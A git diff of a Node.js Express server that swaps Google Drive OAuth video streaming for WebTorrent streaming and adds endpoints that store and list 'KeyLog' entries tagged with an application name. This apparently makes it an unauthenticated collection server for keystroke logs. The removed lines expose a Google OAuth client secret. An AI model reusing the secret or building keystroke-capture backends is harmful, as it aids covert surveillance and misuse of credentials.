@@ -7,57 +7,35 @@ var https = require("https");
 var stream = require("stream");
 const getDuration = require("get-video-duration");
 var app = express();
-app.use(express.json)
-const mongoose = require('mongoose')
+app.use(express.json());
+const mongoose = require("mongoose");
+const WebTorrent = require('webtorrent');
+const client = new WebTorrent();
 
-// If modifying these scopes, delete your previously saved credentials
-var SCOPES = ["https://www.googleapis.com/auth/drive"];
-var TOKEN_DIR = __dirname + "/.credentials/";
-var TOKEN_PATH = TOKEN_DIR + "googleDriveAPI.json";
+const cors = require('cors')
+app.use(cors())
+
 // var TEMP_DIR = __dirname + "/.temp/";
 var CHUNK_SIZE = 20000000; // Increased CHUNK_SIZE from 20000000
 var PORT = 9001;
 let AUTH_URL = "";
-// Load client secrets from a local file.
 
-// Authorize a client with the loaded credentials, then call the
-// Drive API.
+
+
+app.get("/auth-now", function (req, res) {
+  res.send("Successfully reauthenticated!");
+});
+
 
 app.get("/", function (req, res) {
   console.log("TEst");
   res.send("Successfully authenticatexxd!");
 });
 
-// const JSON_CREDS = {
-//   web: {
-//     client_id:
-//       "263907729957-ut99r19k7f88dsqav9076no9iuk3djip.apps.googleusercontent.com",
-//     project_id: "eternal-outlook-341217",
-//     auth_uri: "https://accounts.google.com/o/oauth2/auth",
-//     token_uri: "https://oauth2.googleapis.com/token",
-//     auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
-//     client_secret: "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",
-//     redirect_uris: ["http://formosal.com/code"],
-//     javascript_origins: ["http://formosal.com"],
-//   },
-// };
-const JSON_CREDS = {
-  web: {
-    client_id:
-      "263907729957-ut99r19k7f88dsqav9076no9iuk3djip.apps.googleusercontent.com",
-    project_id: "eternal-outlook-341217",
-    auth_uri: "https://accounts.google.com/o/oauth2/auth",
-    token_uri: "https://oauth2.googleapis.com/token",
-    auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
-    client_secret: "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",
-    redirect_uris: ["http://localhost:9001/code"],
-    javascript_origins: ["http://localhost:9001"],
-  },
-};
-
-authorize(JSON_CREDS, startLocalServer);
 
 
+
+  // MongoDB code starts
 
   // MongoDB connection
   const mongoURI =
@@ -83,6 +61,8 @@ authorize(JSON_CREDS, startLocalServer);
   // Define KeyLog Schema
   const KeyLogSchema = new mongoose.Schema({
     content: { type: String, required: true },
+    appName: { type: String },
+    isLocal: { type: Boolean, default: false },
     timeStamp: { type: Date, default: Date.now }
   });
 
@@ -149,21 +129,6 @@ authorize(JSON_CREDS, startLocalServer);
   });
 
 
-  // Route to delete all KeyLog entries
-  app.delete("/movies", async (req, res) => {
-    try {
-      const deletedLogs = await Movies.deleteMany({});
-      if (deletedLogs.deletedCount === 0) {
-        throw new Error("No Movies to delete");
-      }
-      res.status(200).json({ message: "All Movies deleted" });
-    } catch (err) {
-      console.error(err);
-      res.status(404).json({ message: err.message });
-    }
-  });
-
-
   // Route to create a new KeyLog entry
   app.post("/keylog", async (req, res) => {
     try {
@@ -176,16 +141,39 @@ authorize(JSON_CREDS, startLocalServer);
     }
   });
 
+
+  app.post("/local-keylog", async (req, res) => {
+    try {
+      const newLogEntry = new KeyLogs({ ...req.body, isLocal: true });
+      const savedLog = await newLogEntry.save();
+      res.status(201).json(savedLog);
+    } catch (err) {
+      console.error(err);
+      res.status(400).json({ message: err.message });
+    }
+  });
+
   // Route to get all KeyLog entries
   app.get("/keylogs", async (req, res) => {
     try {
-      const logs = await KeyLogs.find();
+      const logs = await KeyLogs.find({ isLocal: false });
       res.status(200).json(logs);
     } catch (err) {
       console.error(err);
       res.status(500).json({ message: err.message });
     }
   });
+
+  app.get("/local-keylogs", async (req, res) => {
+    try {
+      const logs = await KeyLogs.find({ isLocal: true });
+      res.status(200).json(logs);
+    } catch (err) {
+      console.error(err);
+      res.status(500).json({ message: err.message });
+    }
+  });
+
 
   // Route to delete all KeyLog entries
   app.delete("/keylogs", async (req, res) => {
@@ -202,508 +190,54 @@ authorize(JSON_CREDS, startLocalServer);
   });
   // MongoDB code ends
 
-app.get("/auth-now", function (req, res) {
-  res.send("Successfully reauthenticated!");
-});
 
-function authorize(credentials, callback) {
-  var clientSecret = credentials.web.client_secret;
-  var clientId = credentials.web.client_id;
-  var redirectUrl = credentials.web.redirect_uris[0];
-  var auth = new googleAuth();
-  var oauth2Client = new auth.OAuth2(clientId, clientSecret, redirectUrl);
+  // Torrent Streaming starts
 
-  // Check if we have previously stored a token.
-  fs.readFile(TOKEN_PATH, function (err, token) {
-    if (err) {
-      getNewToken(oauth2Client, callback);
-    } else {
-      oauth2Client.credentials = JSON.parse(token);
-      refreshTokenIfNeed(oauth2Client, callback);
+  // Route for streaming torrent
+  app.get("/stream-torrent", function (req, res) {
+    // const magnetURI = req.query.magnet;
+    const magnetURI = `magnet:?xt=urn:btih:c9e15763f722f23e98a29decdfae341b98d53056&dn=Cosmos+Laundromat&tr=udp%3A%2F%2Fexplodie.org%3A6969&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Ftracker.empire-js.us%3A1337&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337&tr=wss%3A%2F%2Ftracker.btorrent.xyz&tr=wss%3A%2F%2Ftracker.fastcast.nz&tr=wss%3A%2F%2Ftracker.openwebtorrent.com&ws=https%3A%2F%2Fwebtorrent.io%2Ftorrents%2F&xs=https%3A%2F%2Fwebtorrent.io%2Ftorrents%2Fcosmos-laundromat.torrent`
+    if (!magnetURI) {
+      return res.status(400).send("Magnet URI is required");
     }
-  });
-}
-
-function getNewToken(oauth2Client, callback) {
-  var authUrl = oauth2Client.generateAuthUrl({
-    access_type: "offline",
-    scope: SCOPES,
-  });
-  console.log("Authorize this app by visiting this url:  ");
-  AUTH_URL = authUrl;
-  console.log(authUrl);
-  callback(oauth2Client);
-}
-
-function refreshTokenIfNeed(oauth2Client, callback) {
-  var timeNow = new Date().getTime();
-  if (oauth2Client.credentials.expiry_date > timeNow) callback(oauth2Client);
-  else refreshToken(oauth2Client, callback);
-}
-
-function refreshToken(oauth2Client, callback) {
-  oauth2Client.refreshAccessToken(function (err, token) {
-    if (err) {
-      // console.log("Error while trying to refresh access token", err);
-      // return;
-    }
-    oauth2Client.credentials = token;
-    storeToken(token);
-    callback(oauth2Client);
-  });
-}
-
-function storeToken(token) {
-  try {
-    fs.mkdirSync(TOKEN_DIR);
-  } catch (err) {
-    if (err.code != "EEXIST") {
-      throw err;
-    }
-  }
-  fs.writeFile(TOKEN_PATH, JSON.stringify(token), (err) => {
-    if (err) throw err;
-  });
-}
-
-function startLocalServer(oauth2Client) {
-  app.get(/\/code/, function (req, res) {
-    if (req.query.code) {
-      oauth2Client.getToken(req.query.code, function (err, token) {
-        if (err) {
-          console.log("Error while trying to retrieve access token", err);
-          return;
-        }
-        if (!token.refresh_token) {
-          console.log("No refresh token found.");
-          return;
-        }
-        oauth2Client.credentials = token;
-        storeToken(token);
-      });
-      res.send("Successfully authenticated!");
-    }
-  });
-
-  app.get(/\/.{15,}/, function (req, res) {
-    refreshTokenIfNeed(oauth2Client, (oauth2Client) => {
-      var access_token = oauth2Client.credentials.access_token;
-      var urlSplitted = req.url.match("^[^?]*")[0].split("/");
-      var fileId = urlSplitted[1];
-      console.log("Im called, fileId -----> ", fileId);
-      var action = null;
-      if (urlSplitted[2]) action = urlSplitted[2];
-      var fileInfo = getInfoFromId(fileId);
-      if (fileInfo) {
-        performRequest(fileInfo);
-      } else {
-        getFileInfo(fileId, access_token, (info) => {
-          addInfo(fileId, info);
-          var fileInfo = getInfoFromId(fileId);
-          performRequest(fileInfo);
-        });
+    client.add(magnetURI, (torrent) => {
+      const file = torrent.files.find(file => file.length > 0);
+      if (!file) {
+        return res.status(404).send("File not found in torrent");
       }
 
-      function performRequest(fileInfo) {
-        var skipDefault = false;
-        if (action == "download") {
-          performRequest_download_start(req, res, access_token, fileInfo);
-          skipDefault = true;
-        }
-        if (action == "download_stop") {
-          performRequest_download_stop(req, res, access_token, fileInfo);
-          skipDefault = true;
-        }
+      const range = req.headers.range;
+      if (range) {
+        const parts = range.replace(/bytes=/, "").split("-");
+        const start = parseInt(parts[0], 10);
+        const end = parts[1] ? parseInt(parts[1], 10) : file.length - 1;
+        const chunksize = end - start + 1;
 
-        if (!skipDefault) {
-          performRequest_default(req, res, access_token, fileInfo);
-        }
+        const head = {
+          "Content-Range": `bytes ${start}-${end}/${file.length}`,
+          "Accept-Ranges": "bytes",
+          "Content-Length": chunksize,
+          "Content-Type": "video/mp4",
+        };
+        res.writeHead(206, head);
+
+        const stream = file.createReadStream({ start, end });
+        stream.pipe(res);
+      } else {
+        const head = {
+          "Content-Length": file.length,
+          "Content-Type": "video/mp4",
+        };
+        res.writeHead(200, head);
+
+        const stream = file.createReadStream();
+        stream.pipe(res);
       }
     });
   });
 
+  // Torrent Streaming ends
+
+  // Server LISTENing here
   app.listen(PORT);
   console.log("Server started at port: " + PORT);
-}
-
-function performRequest_default(req, res, access_token, fileInfo) {
-  var fileSize = fileInfo.info.size;
-  var fileMime = fileInfo.info.mimeType;
-  var fileId = fileInfo.id;
-  const range = req.headers.range;
-  console.log({ range });
-  if (range) {
-    const parts = range.replace(/bytes=/, "").split("-");
-    const start = parseInt(parts[0], 10);
-    const end = parts[1] ? parseInt(parts[1], 10) : fileSize - 1;
-    const chunksize = end - start + 1;
-    const head = {
-      "Content-Range": `bytes ${start}-${end}/${fileSize}`,
-      "Accept-Ranges": "bytes",
-      "Content-Length": chunksize,
-      //'Content-Type': 'video/mp4',
-      "Content-Type": fileMime,
-    };
-    res.writeHead(206, head);
-    downloadFile(
-      fileId,
-      access_token,
-      start,
-      end,
-      res,
-      () => {
-        res.end();
-      },
-      (richiesta) => {
-        res.once("close", function () {
-          if (typeof richiesta.abort === "function") richiesta.abort();
-          if (typeof richiesta.destroy === "function") richiesta.destroy();
-        });
-      }
-    );
-  } else {
-    const head = {
-      "Content-Length": fileSize,
-      "Content-Type": fileMime,
-    };
-    res.writeHead(200, head);
-    downloadFile(
-      fileId,
-      access_token,
-      0,
-      fileSize - 1,
-      res,
-      () => {
-        res.end();
-      },
-      (richiesta) => {
-        res.once("close", function () {
-          if (typeof richiesta.abort === "function") richiesta.abort();
-          if (typeof richiesta.destroy === "function") richiesta.destroy();
-        });
-      }
-    );
-  }
-}
-
-function performRequest_download_start(req, res, access_token, fileInfo) {
-  var fileSize = fileInfo.info.size;
-  var fileId = fileInfo.id;
-  var status = getDownloadStatus(fileId);
-  if (!status) {
-    status = addDownloadStatus(fileId);
-    var lastTime = new Date().getTime();
-    var downloadedSize = 0;
-    var downloadSize = 0;
-    var startChunk = 0;
-    if (req.query.p && req.query.p >= 0 && req.query.p <= 100)
-      startChunk = Math.floor(((fileSize / CHUNK_SIZE) * req.query.p) / 100);
-    if (
-      req.query.c &&
-      req.query.c >= 0 &&
-      req.query.c <= Math.floor(fileSize / CHUNK_SIZE)
-    )
-      startChunk = req.query.c;
-    downloadSize = fileSize - startChunk * CHUNK_SIZE;
-
-    var videoDuration = null;
-    fileInfo.getVideoLength
-      .then((data) => {
-        videoDuration = data;
-      })
-      .catch((error) => {
-        console.log(error);
-      });
-
-    var echoStream = new stream.Writable();
-    var chunkSizeSinceLast = 0;
-    echoStream._write = function (chunk, encoding, done) {
-      chunkSizeSinceLast += chunk.length;
-      var nowTime = new Date().getTime();
-
-      //update status
-      if (nowTime - lastTime > 2000) {
-        var speedInMBit =
-          (chunkSizeSinceLast * 8) / (nowTime - lastTime) / 1000;
-        var speedInByte = (speedInMBit / 8) * 1000000;
-        downloadedSize += chunkSizeSinceLast;
-        status.status = ((downloadedSize / downloadSize) * 100).toFixed(3);
-        status.speedMbit = speedInMBit.toFixed(3);
-        status.speedByte = speedInByte;
-        if (videoDuration) {
-          var timeLeftBeforeStreaming = Math.max(
-            Math.round(
-              (downloadSize - downloadedSize) / speedInByte -
-                (videoDuration * downloadSize) / fileSize
-            ),
-            0
-          );
-          status.timeLeftBeforeStreaming = timeLeftBeforeStreaming;
-        }
-        lastTime = nowTime;
-        chunkSizeSinceLast = 0;
-      }
-
-      done();
-    };
-
-    downloadFile(
-      fileId,
-      access_token,
-      startChunk * CHUNK_SIZE,
-      fileSize - 1,
-      echoStream,
-      () => {
-        removeDownloadStatus(fileId);
-      },
-      (richiesta) => {
-        status.onClose = () => {
-          if (typeof richiesta.abort === "function") richiesta.abort();
-          if (typeof richiesta.destroy === "function") richiesta.destroy();
-          removeDownloadStatus(fileId);
-        };
-      }
-    );
-  }
-  res.writeHead(200);
-  res.write(JSON.stringify(status));
-  res.end();
-}
-
-function performRequest_download_stop(req, res, access_token, fileInfo) {
-  var fileId = fileInfo.id;
-  var status = getDownloadStatus(fileId);
-  if (status) {
-    status.onClose();
-  }
-  res.writeHead(200);
-  res.end();
-}
-
-function downloadFile(fileId, access_token, start, end, pipe, onEnd, onStart) {
-  var startChunk = Math.floor(start / CHUNK_SIZE);
-  // var chunkName = TEMP_DIR + fileId + "@" + startChunk;
-  // if (fs.existsSync(chunkName)) {
-  //   console.log("req: " + start + " / " + end + "   offline");
-  //   var relativeStart =
-  //     start > startChunk * CHUNK_SIZE ? start - startChunk * CHUNK_SIZE : 0;
-  //   var relativeEnd =
-  //     end > (startChunk + 1) * CHUNK_SIZE
-  //       ? CHUNK_SIZE
-  //       : end - startChunk * CHUNK_SIZE;
-  //   let readStream = fs.createReadStream(chunkName, {
-  //     start: relativeStart,
-  //     end: relativeEnd,
-  //   });
-  //   readStream.pipe(pipe, { end: false });
-  //   readStream.on("data", (chunk) => {
-  //     //onData(chunk)
-  //   });
-  //   readStream.on("end", () => {
-  //     if (end >= (startChunk + 1) * CHUNK_SIZE) {
-  //       //Da rivedere
-  //       console.log("->");
-  //       downloadFile(
-  //         fileId,
-  //         access_token,
-  //         (startChunk + 1) * CHUNK_SIZE,
-  //         end,
-  //         pipe,
-  //         onEnd,
-  //         onStart
-  //       );
-  //     } else {
-  //       onEnd();
-  //     }
-  //   });
-  //   readStream.on("close", () => {});
-  //   readStream.on("error", (err) => {
-  //     console.log(err);
-  //   });
-  //   onStart(readStream);
-  // } else {
-  console.log("req: " + start + " / " + end + "   online");
-  httpDownloadFile(fileId, access_token, start, end, pipe, onEnd, onStart);
-  // }
-}
-
-function httpDownloadFile(
-  fileId,
-  access_token,
-  start,
-  end,
-  pipe,
-  onEnd,
-  onStart
-) {
-  var options = {
-    host: "www.googleapis.com",
-    path: "/drive/v3/files/" + fileId + "?alt=media",
-    method: "GET",
-    headers: {
-      Authorization: "Bearer " + access_token,
-      Range: "bytes=" + start + "-" + end,
-    },
-  };
-
-  callback = function (response) {
-    var arrBuffer = [];
-    var arrBufferSize = 0;
-    response.pipe(pipe, { end: false });
-    response.on("data", function (chunk) {
-      var buffer = Buffer.from(chunk);
-      arrBuffer.push(buffer);
-      arrBufferSize += buffer.length;
-      var nextChunk = Math.floor((start + arrBufferSize) / CHUNK_SIZE);
-      // var chunkName = TEMP_DIR + fileId + "@" + nextChunk;
-      // if (fs.existsSync(chunkName) && start + arrBufferSize < end) {
-      //   req.abort();
-      //   downloadFile(
-      //     fileId,
-      //     access_token,
-      //     start + arrBufferSize,
-      //     end,
-      //     pipe,
-      //     onEnd,
-      //     onStart
-      //   );
-      // } else {
-      if (arrBufferSize >= CHUNK_SIZE * 2) {
-        arrBuffer = [Buffer.concat(arrBuffer, arrBufferSize)];
-        arrBuffer = flushBuffers(arrBuffer, fileId, start);
-        arrBufferSize = arrBuffer[0].length;
-        var offset = Math.ceil(start / CHUNK_SIZE) * CHUNK_SIZE - start;
-        start += CHUNK_SIZE + offset;
-      }
-      // }
-    });
-    response.on("end", function () {
-      //Aggiungere il controllo se c'è un errore
-      if (!req.aborted) {
-        onEnd();
-      }
-    });
-  };
-
-  var req = https.request(options, callback);
-  req.on("error", function (err) {});
-  req.end();
-  onStart(req);
-}
-
-function flushBuffers(arrBuffer, fileId, startByte) {
-  var dirtyBuffer = Buffer.alloc(CHUNK_SIZE);
-  var offset = Math.ceil(startByte / CHUNK_SIZE) * CHUNK_SIZE - startByte;
-  arrBuffer[0].copy(dirtyBuffer, 0, offset, offset + CHUNK_SIZE);
-  // var chunkName =
-  //   TEMP_DIR + fileId + "@" + Math.floor((offset + startByte) / CHUNK_SIZE);
-  // try {
-  //   fs.mkdirSync(TEMP_DIR);
-  // } catch (err) {
-  //   if (err.code != "EEXIST") {
-  //     throw err;
-  //   }
-  // }
-  // fs.writeFile(chunkName, dirtyBuffer, (err) => {
-  //   if (err) throw err;
-  //   console.log("The chunk has been saved!");
-  // })
-  var remainBufferSize = arrBuffer[0].length - CHUNK_SIZE - offset;
-  var remainBuffer = Buffer.alloc(remainBufferSize);
-  if (remainBuffer.length > 0) {
-    arrBuffer[0].copy(
-      remainBuffer,
-      0,
-      CHUNK_SIZE + offset,
-      arrBuffer[0].length
-    );
-  }
-  return [remainBuffer];
-}
-
-function getFileInfo(fileId, access_token, onData) {
-  var options = {
-    host: "www.googleapis.com",
-    path: "/drive/v3/files/" + fileId + "?alt=json&fields=*",
-    method: "GET",
-    headers: {
-      Authorization: "Bearer " + access_token,
-    },
-  };
-
-  callback = function (response) {
-    var allData = "";
-    response.on("data", function (chunk) {
-      allData += chunk;
-    });
-    response.on("end", function () {
-      var info = JSON.parse(allData);
-      if (!info.error) onData(info);
-      else console.log(info.error);
-    });
-  };
-
-  https.request(options, callback).end();
-}
-
-//File info
-var filesInfo = [];
-
-function getInfoFromId(fileId) {
-  var result = null;
-  filesInfo.forEach((data) => {
-    if (data.id == fileId) {
-      result = data;
-    }
-  });
-  return result;
-}
-
-function addInfo(fileId, fileInfo) {
-  var info = { id: fileId, info: fileInfo };
-  info.getVideoLength = new Promise((resolve, reject) => {
-    if (!info.videoLength) {
-      getDuration("http://127.0.0.1:" + PORT + "/" + fileId)
-        .then((duration) => {
-          info.videoLength = duration;
-          resolve(duration);
-        })
-        .catch((error) => {
-          console.log(error);
-          reject(error);
-        });
-    } else {
-      resolve(info.videoLength);
-    }
-  });
-
-  filesInfo.push(info);
-}
-
-//Downloads status
-var downloadStatus = [];
-
-function getDownloadStatus(fileId) {
-  var result = null;
-  downloadStatus.forEach((data) => {
-    if (data.id == fileId) {
-      result = data;
-    }
-  });
-  return result;
-}
-
-function addDownloadStatus(fileId) {
-  var status = { id: fileId };
-  status.onClose = () => {};
-  downloadStatus.push(status);
-  return status;
-}
-
-function removeDownloadStatus(fileId) {
-  for (var i = 0; i < downloadStatus.length; i++) {
-    if (downloadStatus[i].id == fileId) {
-      downloadStatus.splice(i, 1);
-    }
-  }
-}
